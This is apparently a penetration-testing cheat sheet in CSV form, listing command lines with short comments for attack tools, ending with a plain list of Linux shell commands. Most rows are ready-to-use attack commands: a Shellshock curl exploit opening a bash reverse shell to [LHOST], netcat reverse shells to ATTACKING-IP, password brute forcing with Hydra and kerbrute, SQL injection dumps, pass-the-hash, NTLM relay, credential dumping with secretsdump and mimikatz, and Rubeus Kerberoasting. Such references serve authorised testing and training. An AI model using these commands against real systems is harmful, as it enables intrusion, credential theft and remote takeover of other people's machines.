CommandID,Command,Comment,Program
495,"<c:out value=""${[variableName]}"" />","Echo hello world, test for RCE in JSP application.",
496,"for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v ""......................................................"" | sed s/.*11/11/g | grep ""11.*99""  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done",Convert exfil ICMP back to files from pcap,
497,mount -t nfs 10.0.0.2:[/their/share] [/Mount/point] -o nolock,Mount a NFS share (check for root squash),
498,/path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP],Used to guess common SIDs in Oracle databases,
499,/path/to/odat/odat-libc2.5-x86_64 passwordguesser -d [SID] -s [IP],Used to brute common passwords in Oracle TNS listener,
500,ping6 -c1 -I < [Interface] ff02::1 | tee ipv6-hosts,Piped to tee for later manipulation,
501,udp-proto-scanner.pl -f [FileOfIP],Quick and dirty UDP service discovery,
502,snmpget udp6:[ipv6 address] [OID],SNMPGet supports ipv6,
503,"curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H ""custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 ""","Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.",
504,padbuster [url] [EncodedData] 8 --cookies '[UserCookies]'  -encoding 0 --plaintext user=[TextToEncode],"Padding Oracle attack, break encrypted cookies",
505,"upower -i $(upower -e | grep 'BAT') | grep -E ""state|to\ full|percentage""",Check battery level,
506,"def process = ""ls -l"".execute();println ""Found text ${process.text}""","Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.",
507,urlcrazy [domain],"Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, and corporate espionage.",
508,kerbrute bruteusers [flags],brute single user password,
509,kerbrute brutforce [flags],brute username:password combos from file or stdin,
510,kerbrute passwordspray [flags],test a single password agains a list of users,
511,kerbrute userenum [flags],Enumerate valid domain usernames via kerberos,
512,nth --text '<hash>',Find the hash type of a string,
513,nth --file <hash file>,Find the hash type of a file,
514,nmap --script vuln <HOST_IP>,scan for vulnerabilites,
515,nikto -h <HOST_IP>,Scan host for vulnerabilites,
516,smbclient -L \\\\<HOST_IP>,check for misconfigured anonymous login,SMBClient
517,hydra -l <username> -P <password list> <HOST_IP> http-post-form '<url where requests are made> : request with ^USER^ and ^PASS^ in it : <output string on failure>',Brutforce a webpage looking for usernames,Hydra
518,smbmap -u <user> -p <pass> -H <host IP>,enumerates SMB file shares,
519,wpscan --url <wp site> --enumerate --plugins-detection,Enumerate Wordpress website,
520,wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic,enumerate though known usernames,
521,powershell.exe -exec bypass,bypass execution policy,
522,theharvester -d <domain> -l <#> -g -b google,gathering informaiton from online sources,
523,nc -lvnp <port #>,open a listener,
524,nc <attacker ip> <attacker port>,Connect to computer,
525,gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>,Eunmerate directories on a website with a cookie,
526,sqlmap -u <IP> --batch --force-ssl,map sql at an IP,SQLMap
527,john <HASHES_FILE> --wordlist=<wordlist>,Use wordlist to parse hash,
528,john <Unshadowed passwds>,unencrypt shadow file,
529,unshadow <passwd> <shadow>,combine /etc/passwd and /etc/shadow file for cracking,
530,hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force,crack hashes with a wordlist,
531,enum4linux -a <IP>,basic command,
532,smbclinet //<IP>/<share> -U <username>,connect to a SMB share,
533,nc -e /bin/sh <ATTACKING-IP> 80,connect with shell (-e normally disabled for security),
534,/bin/sh | nc ATTACKING-IP 80,connect with shell (-e doest always work),
535,rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p,done on the target,
536,bash -x <.sh file>,for stepping through bash script and debugging,Bash
537,sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3,automated SQL scan,SQLMap
538,crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M <module>,run a mimikatz module,CrackMapExec
539,crackmapexec smb <target(s)> -u '<username>' -p '<password>' -x whoami,Command execution,CrackMapExec
540,crackmapexec smb <target(s)> -u '<username>' -p '<password>' --lusers,check logged in users,CrackMapExec
541,crackmapexec <target(s)> -u '<uesrname>' -p '<password>' --local-auth --sam,dump local SAM hashes,CrackMapExec
542,crackmapexec smb <target(s)> -u '' -p '',null session login,CrackMapExec
543,cme <protocol> -L,list modules,CrackMapExec
544,crackmapexec smb <target(s)> -u username -H (LMHASH:)NTHASH,pass the hash,CrackMapExec
545,psk-crack -d </path/to/dictionary> <psk file>,attack pre shared key with dictionary,PSK-Crack
546,ike-scan <IP> -A -id GroupVPN,"If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN",IKE-Scan
547,ike-scan <IP> -A -P<file out>,to find aggressive mode VPNs and save for use with psk-crack,IKE-Scan
548,for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done,crack passwords with korelogic rules,
549,"nmap -sL -n 192.168.1.1-100,102-254 | grep ""report for"" | cut -d "" "" -f 5 > ip_list_192.168.1.txt",create a list of ip addresses,Nmap
550,mount -t nfs server:/share /mnt/point,mount NFS share on linux,
551,net user <username> <password> /ADD,create new user,
552,net localgroup <group> <username> /ADD,add user to a group (normaly Administrators),
553,"psk-crack -b <#> --charset=""<charlist>"" <key file>",brute force with specified length and specified chars (if left blank default is 36),PSK-Crack
554,psk-crack -d <file> <key file>,dictianary attack,PSK-Crack
555,"sqlmap -o -u ""<url of form>"" --forms",check form for SQL injection,SQLMap
556,"sqlmap -u ""<form URL>?id=1>"" --dbms=mysql --tech=U --random-agent --dump",Scan url for union + error based injection with mysql backend and use a random user agent + database dump,SQLMap
557,sessions -u <session #>,Upgrade a shell to meterpreter in metasploit,Metasploit
558,hydra -P <wordlist> -v <ip> <protocol>,Brute force against a protocol of your choice,Hydra
559,hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>,"You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)",Hydra
560,hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>,Attack a Windows Remote Desktop with a password list.,Hydra
561,hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location',Craft a more specific request for Hydra to brute force.,Hydra
562,certutil -urlcache -f <url of file> <output file name>,download file using windows cmd.exe,Cmd
563,"powershell -c wget ""<url of file>"" -outfile ""<output file name>""",Download file from cmd using pwershell,Cmd
564,psexec.py [[domain/] username [: password] @] [Target IP Address],,psexec.py
565,smbexec -hashes <LM hash:NTLM Hash> <name>@<IP>,,smbexec.py
566,atexec.py [[domain/] username [: password] @] [Target IP Address] [Command],,atexec.py
567,wmiexec.py [[domain/] username [: password] @] [Target IP Address],,wmiexec.py
568,GetUserSPNs.py -request -dc-ip <DC IP> <IP>/<user>,,GetUserSPNs.py
569,ticketConverter.py raj.ccache ticket.kirbi,,ticketConverter.py
570,ticketer.py -nthash <hash> -domain-sid [e.g. S-1-5-21-3523557010-2506964455-2614950430] -domain <domain IP/name> <user,,ticketer.py
571,secretsdump.py -just-dc-ntlm <Domain name>/<username>@<IP>,,secretsdump.py
572,wmiquery.py [[domain/] username [: password] @] [Target IP Address],,wmiquery.py
573,smbclient.py <domain>/<user>:<password/hash>@<Target IP Address>,Mini shell using some of the SMB funcionality of the library using username and password/NTLM hash,smbclient.py
574,getArch.py -target(s) <Target (List)>,,getArch.py
575,lookupsid.py <domain>/<user>:<password/hash>@<Target IP Address>,,lookupsid.py
576,netview.py <domain>/<User> -target(s) <Target (List)> -users <User List>,,netview.py
577,reg.py <domain>/<user>:<password/hash>@<Target IP Address> <action> <action parameter>,,reg.py
578,rpcdump.py [[domain/] username [: password] @] [Target IP Address],,rpcdump.py
579,rpcdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address],,rpcmap.py
580,samrdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address],,samrdump.py
581,services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action],,services.py
582,mssqlclient.py -windows-auth <domain name>/<username>@<IP>,,mssqlclient.py
583,GetADUSers.py -all <IP>l/<Username>:<password/hash>@987 -dc-ip <domain IP>,,GetADUsers.py
584,sniff.py,packet sniffer that listens and creates pcap file,sniff.py
585,sniffer.py,listens for specific protocols,sniffer.py
586,ping.py [Source IP] [Destination IP],,ping.py
587,ifmap.py [Target IP Address] [Target Port],,ifmap.py
588,opdump.py [Target IP Address] [Port Interface Version],,opdump.py
589,esentutl.py databaseFile (dump|info|export),"An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit)",esentutl.py
590,GetADUsers.py domain/user:password@IP,This script will gather data about the domain's users and their corresponding email addresses.,GetADUsers.py
591,getArch.py -target(s) <IP (List.txt)>,This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed,getArch.py
592,goldenPac.py domain/user:password@IP,Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.,goldenPac.py
593,ifmap.py <target IP> <target port>,his script will bind to the target's MGMT interface to get a list of interface IDs,ifmap.py
594,karmaSMB.py <filenamePathname> (-smb2support),A SMB Server that answers specific file contents regardless of the SMB share and pathname spec,karmaSMB.py
595,lookupsid.py domain/user:password@IP,A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface aiming at finding remote users/groups,lookupsid.py
596,mimikatz.py domain/user:password@IP,Mini shell to control a remote mimikatz RPC server,mimikatz.py
597,mqtt_check.py domain/user:password@IP (-ssl),Simple MQTT example aimed at playing with different login options.,mqtt_check.py
598,mssqlinstance.py <target IP>,Retrieves the MSSQL instances names from the target host,mssqlinstance.py
599,netview.py <domain>/<user>:<password> -target <IP>,Gets a list of the sessions opened at the remote hosts,netview.py
600,ntfs-read.py /dev/disk1,"This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents.",ntfs-read.py
601,"ntlmrelayx.py -tf targets.txt (-c ""ipconfig"")","This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.) By default, it dumps the SAM database",ntlmrelayx.py
602,opdump.py <hostname> <port> <interface> <version>,"This binds to the given hostname:port and MSRPC interface. Then, it tries to call each of the first 256 operation numbers in turn and reports the outcome of each call Need to get interfaces, for example with ifmap.py",opdump.py
603,ping.py <src-ip> <dst-ip>,Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.,ping.py
604,ping6.py <src-ip> <dst-ip>,Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.,ping6.py
605,rdp_check.py domain/user:password@IP,[MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP  auth. This example test whether an account is valid on the target host.,rdp_check.py
606,reg.py domain/user:password@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s,Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. (similar to reg.exe),reg.py
607,rpcdump.py <domain>/<user>:<password>@<IP>,This script will dump the list of RPC endpoints and string bindings registered at thetarget. It will also try to match them with a list of well known endpoints.,rpcdump.py
608,samrdump.py <server>/<user>:<password>@<IP>,"An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service.",samrdump.py
609,secretsdump.py -just-dc-ntlm domain/user:password@IP,secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH,secretsdump.py
610,services.py  <server>/<user>:<password>@<IP> <start|stop|delete|status|config|list|create|change),This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface.,services.py
611,smbrelayx.py -h victimIP -c cmdToExecute,Exploit for CVE-2015-0005 using a SMB Relay Attack.,smbrelayx.py
612,smbserver.py <SHARENAME> </path/to/your/local/share> (--username <user> --password <password>),A Python implementation of an SMB server. Allows to quickly set up shares and user accounts,smbserver.py
613,wmipersist.py domain/user:password@IP <install/remove>,This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.,wmipersist.py
614,wmiquery.py domain/user:password@IP,It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account).,wmiquery.py
615,goldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.,goldenPac.py
616,smbrelayx.py -h victimIP -e payload.exe,Exploit for CVE-2015-0005 using a SMB Relay Attack.,smbrelayx.py
617,lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface aiming at finding remote users/groups,lookupsid.py
618,mimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Mini shell to control a remote mimikatz RPC server,mimikatz.py
619,rdp_check.py <domain>/<username>@<IP> -hashes <LMHASH:NTHASH>,Enumerates RDP,rdp_check.py
620,reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. (similar to reg.exe),reg.py
621,rpcdump.py -dc-ip <domain controler IP/hosts file name> -target-ip <IP> <domain>/<user>:<password>,This script will dump the list of RPC endpoints and string bindings registered at thetarget. It will also try to match them with a list of well known endpoints.,rpcdump.py
622,mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x,"An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.",mssqlinstance.py
623,"ntfs-read.py ""\C:"" (-extract ""\windows\system32\config\sam"")","This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents.",ntfs-read.py
624,hydra -P password-file.txt -v <IP> snmp,Hydra brute force against SNMP,Hydra
625,hydra -t 1 -l <username> -P <password.txt> -vV <IP> ftp,Hydra FTP known user and password list,Hydra
626,hydra -v -V -u -L <usernames.txt> -P <passwords.txt> -t 1 -u <IP> ssh,Hydra SSH using list of users and passwords,Hydra
627,"hydra -v -V -u -L <usersnames.txt> -p """" -t 1 -u <IP> ssh",Hydra SSH using a known password and a username list,Hydra
628,hydra <IP> -s <port (22)> ssh -l -P big_wordlist.txt,Hydra SSH Against Known username on port,Hydra
629,hydra -l <username> -P <password-list.txt> -f <IP> pop3 -V,Hydra POP3 Brute Force,Hydra
630,hydra -P <passwords.txt> <IP> smtp -V,Hydra SMTP Brute Force,Hydra
631,hydra -L <usernames.txt> -P <passwords.txt> <IP> http-get /<path to form>,Hydra attack http get 401 login with a dictionary,Hydra
632,hydra -t 1 -V -f -l <username> -P <passwords.txt> rdp://<IP>,Hydra attack Windows Remote Desktop with rockyou,Hydra
633,hydra -t 1 -V -f -l <username> -P <password file> <IP> smb,Hydra brute force SMB,Hydra
634,hydra -l <username> -P <passwordlist.txt> <IP> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location',Hydra brute force a Wordpress admin login,Hydra
635,hydra -L <usernames.txt> -P <passwords.txt> <IP> smb -V -f,SMB Brute Forcing,Hydra
636,hydra -L <usernames.txt> -P <passwords.txt> <IP> ldap2 -V -f,LDAP Brute Forcing,Hydra
637,Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec],"Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:",Rubeus
638,Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec],"Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:",Rubeus
639,"Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec]","Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:",Rubeus
640,Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap],"Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:",Rubeus
641,Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap],Perform a Kerberos-based password bruteforcing attack:,Rubeus
642,Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self],Perform S4U constrained delegation abuse:,Rubeus
643,Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit],Perform S4U constrained delegation abuse:,Rubeus
644,Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self],Perform S4U constrained delegation abuse across domains,Rubeus
645,Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID],"Submit a TGT, optionally targeting a specific LUID (if elevated)",Rubeus
646,Rubeus.exe purge [/luid:LOGINID],"Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated)",Rubeus
647,Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>,Parse and describe a ticket (service ticket or TGT),Rubeus
648,Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],"Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:",Rubeus
649,Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],Rubeus
650,Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap],"Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:",Rubeus
651,Rubeus.exe tgtdeleg [/target:SPN],"Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:",Rubeus
652,Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS],Monitor every /interval SECONDS (default 60) for new TGTs:,Rubeus
653,Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS],"Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):",Rubeus
654,"Rubeus.exe kerberoast [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]",Perform Kerberoasting,Rubeus
655,"Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]","Perform Kerberoasting, outputting hashes to a file:",Rubeus
656,"Rubeus.exe kerberoast /simple [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]","Perform Kerberoasting, outputting hashes in the file output format, but to the console",Rubeus
657,"Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]",Perform Kerberoasting with alternate credentials,Rubeus
658,"Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]",Perform Kerberoasting with an existing TGT,Rubeus
659,"Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]",Perform Kerberoasting with an existing TGT using an enterprise principal,Rubeus
660,Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/nowrap],Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:,Rubeus
661,Rubeus.exe kerberoast /usetgtdeleg [/nowrap],Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:,Rubeus
662,Rubeus.exe kerberoast /rc4opsec [/nowrap],"Perform ""opsec"" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts",Rubeus
663,Rubeus.exe kerberoast /stats [/nowrap],List statistics about found Kerberoastable accounts without actually sending ticket requests,Rubeus
664,Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap],"Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter)",Rubeus
665,Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap],"Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:",Rubeus
666,Rubeus.exe kerberoast /aes [/nowrap],Perform AES Kerberoasting:,Rubeus
667,"Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]","Perform AS-REP ""roasting"" for any users without preauth",Rubeus
668,"Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]","Perform AS-REP ""roasting"" for any users without preauth, outputting Hashcat format to a file",Rubeus
669,"Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""] [/nowrap]","Perform AS-REP ""roasting"" for any users without preauth using alternate credentials",Rubeus
670,"Rubeus.exe createnetonly /program:""C:\Windows\System32\cmd.exe"" [/show]","Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:",Rubeus
671,Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER],Reset a user's password from a supplied TGT,Rubeus
672,Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN],"Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes",Rubeus
673,Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap],Substitute an sname or SPN into an existing service ticket,Rubeus
674,Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap],Substitute an sname or SPN into an existing service ticket,Rubeus
675,Rubeus.exe currentluid,Display the current user's LUID,Rubeus
676,kerbrute -domain <domain name> -users <users.txt> -passwords <passwords.txt> -outputfile <file name>,Eunmerate domain with username and corrisponding passwords,Kerbrute
677,smbclient -U <username. //<IP>/<share>,for connecting to a SMB share as a different user,SMBClient
678, apropos,Search Help manual pages (man -k),Shell
679, apt-get,Search for and install software packages (Debian),Shell
680, aptitude,Search for and install software packages (Debian),Shell
681, aspell,Spell Checker,Shell
682, awk,"Find and Replace text, database sort/validate/index",Shell
683, basename,Strip directory and suffix from filenames,Shell
684, bash,Boot new Bourne-Again Shell,Shell
685, bc,Arbitrary precision calculator language,Shell
686, bg,Send to background,Shell
687, break,Exit from a loop,Shell
688, builtin,Run a shell builtin,Shell
689, bzip2,Compress or decompress named files,Shell
690, cal,Display a calendar,Shell
691, case,Conditionally perform a command,Shell
692, cat,Concatenate and print (display) the content of files,Shell
693, cd,Change Directory,Shell
694, cfdisk,Partition table manipulator for Linux,Shell
695, chgrp,Change group ownership,Shell
696, chmod,Change access permissions,Shell
697, chown,Change file owner and group,Shell
698, chroot,Run a command with a different root directory,Shell
699, chkconfig,System services (runlevel),Shell
700, cksum,Print CRC checksum and byte counts,Shell
701, clear,Clear terminal screen,Shell
702, cmp,Compare two files,Shell
703, comm,Compare two sorted files line by line,Shell
704, command,Run a command – ignoring shell functions,Shell
705, continue,Resume the next iteration of a loop,Shell
706, cp,Copy one or more files to another location,Shell
707, cron,Daemon to execute scheduled commands,Shell
708, crontab,Schedule a command to run at a later time,Shell
709, csplit,Split a file into context-determined pieces,Shell
710, cut,Divide a file into several parts,Shell
711, date,Display or change the date and time,Shell
712, dc,Desk Calculator,Shell
713, dd,"Convert and copy a file, write disk headers, boot records",Shell
714, ddrescue,Data recovery tool,Shell
715, declare,Declare variables and give them attributes,Shell
716, df,Display free disk space,Shell
717, diff,Display the differences between two files,Shell
718, diff3,Show differences among three files,Shell
719, dig,DNS lookup,Shell
720, dir,Briefly list directory contents,Shell
721, dircolors,Colour setup for `ls’,Shell
722, dirname,Convert a full pathname to just a path,Shell
723, dirs,Display list of remembered directories,Shell
724, dmesg,Print kernel &amp; driver messages,Shell
725, du,Estimate file space usage,Shell
726, echo,Display message on screen,Shell
727, egrep,Search files for lines that match an extended expression,Shell
728, eject,Eject removable media,Shell
729, enable,Enable and disable builtin shell commands,Shell
730, env,Environment variables,Shell
731, ethtool,Ethernet card settings,Shell
732, eval,Evaluate several commands/arguments,Shell
733, exec,Execute a command,Shell
734, exit,Exit the shell,Shell
735, expect,Automate arbitrary applications accessed over a terminal,Shell
736, expand,Convert tabs to spaces,Shell
737, export,Set an environment variable,Shell
738, expr,Evaluate expressions,Shell
739, false,"Do nothing, unsuccessfully",Shell
740, fdformat,Low-level format a floppy disk,Shell
741, fdisk,Partition table manipulator for Linux,Shell
742, fg,Send job to foreground,Shell
743, fgrep,Search files for lines that match a fixed string,Shell
744, file,Determine file type,Shell
745, find,Search for files that meet a desired criteria,Shell
746, fmt,Reformat paragraph text,Shell
